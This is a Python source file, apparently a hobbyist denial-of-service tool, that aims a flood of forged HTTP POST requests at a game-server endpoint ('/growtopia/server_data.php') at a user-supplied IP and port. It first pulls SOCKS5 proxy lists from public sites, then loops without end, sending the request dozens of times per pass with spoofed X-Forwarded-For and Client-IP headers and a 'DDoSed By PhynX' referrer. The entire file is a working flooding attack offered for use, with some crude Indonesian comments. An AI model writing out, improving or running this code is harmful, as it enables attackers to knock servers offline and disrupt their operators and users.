#This Tools Originally created by PhynX
#Use At Your Own Risk.
# -*- coding: utf-8 -*-

import socket, random, time, socks, sys, os, ssl, requests
def apdet():
    pler = str(input('Update Proxy? [Y/N] : '))
    if pler == 'Y':
        surtod = open('proxies.txt','wb')
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",timeout=5)
            surtod.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
            surtod.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
            surtod.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
            surtod.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://multiproxy.org/txt_all/proxy.txt", timeout=5)
            surtod.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", timeout=5)
            surtod.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
            surtod.write(r.content)
            surtod.close()
            os.system('cls')
        except:
            surtod.close()
    else:
        pass
def ponik():
    global ip, port, pesan, i, peloxi, mpsh, mpshah
    i = 0
    mpsh = int(0)
    apdet()
    try:
        os.system('cls')
        ip = str(input("Masukin IP : ")) #masukin target
        port = int(input("Masukin Port Target : ")) #masukin port
        print('Total Proxy : %s' % (len(open('proxies.txt').readlines())))
        print('-------------------------')
        # try:
        #     ip = ip.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        # except:
        #     ip = ip.replace("http://", "").replace("https://", "").split("/")[0]
        nyerang()
    except:
        print("Yang bener kontol")
        os.system('cls')
        ponik()
def nyerang():
    global ip, port, pesan, i, peloxi, mpsh, mpshah
    pesan = 'POST /growtopia/server_data.php HTTP/1.0\r\nHost: ' + ip + '\r\nUser-Agent: PhynX Was Here\r\nAccept-Encoding: gzip, deflate\r\nReferrer: DDoSed By PhynX\r\nX-Forwarded-For: 111.111.111.111\r\nClient-IP: 222.222.222.222\r\nConnection: Keep-Alive\r\n'
    # ip = socket.gethostbyname(ip)
    mpshah = mpsh
    pe_adu_bapak = open('proxies.txt').readlines() #kasihan yteam
    if mpshah < len(pe_adu_bapak):
        peloxi = pe_adu_bapak[mpshah].strip().split(':')
    else:
        peloxi = random.choice(pe_adu_bapak).strip().split(":")
    while True:
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(peloxi[0]), int(peloxi[1]), True)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if port == '443':
                esesel = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                sock = esesel.wrap_socket(sock, server_hostname=ip)
            sock.connect((ip, port))
            sock.settimeout(360)
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            sock.sendall(str.encode(pesan))
            i+=1
            sys.stdout.write(str(i)+" Requests send.\r")
            sys.stdout.flush()
        except:
            sock.close()
            nyerang()

if __name__ == '__main__':
    ponik()
